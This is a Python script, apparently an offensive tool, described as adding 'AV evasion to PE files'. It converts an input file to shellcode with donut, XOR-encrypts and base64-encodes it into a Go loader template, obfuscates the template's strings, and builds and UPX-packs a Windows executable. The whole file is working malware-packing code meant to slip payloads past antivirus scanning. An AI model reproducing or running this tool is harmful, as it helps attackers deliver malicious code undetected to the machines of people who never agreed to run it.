#!/usr/bin/env python3

import donut
import os
import base64
import argparse
from itertools import cycle
import warnings
import os
import re
warnings.filterwarnings("ignore", category=DeprecationWarning) 


key = os.urandom(9)
def bake(data):
    temp  = []
    for i in range(0, len(data)): 
        temp.append(data[i] ^ key[i % len(key)]) 
    encrypted = bytes(temp)     
    encoded = base64.b64encode(encrypted)
    return encoded

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Adds AV evasion to PE files)')
    parser.add_argument('infile',  type=str, help='input file (shellcode)')
    parser.add_argument('outfile',  type=str, help='output file (executeable)')
    args = parser.parse_args()

    shellcode = donut.create(
        file=args.infile 
    ) 

    os.system("cp load.go load.go.bak")
    with open("load.go") as f:
        temp = f.read()
        temp = temp.replace('§shellcode§',bake(shellcode).decode())
        temp = temp.replace('§key§',base64.b64encode(key).decode())     

        pattern = r"§(.*)§"
        matches = re.finditer(pattern, temp, re.MULTILINE)
        for matchNum, match in enumerate(matches, start=1):
            placeholder = match.group()
            temp = temp.replace(placeholder,bake(bytes(placeholder.replace('§',''), encoding='utf8')).decode())
            
    with open("load.go", "w") as f:
        f.write(temp)
    os.system("GOOS=windows GOARCH=amd64 go build -ldflags=\"-s -w\" -buildmode=pie -o raw.exe load.go")
    os.system("upx raw.exe -o "+args.outfile)
    os.system("cp load.go.bak load.go; rm load.go.bak; rm raw.exe")
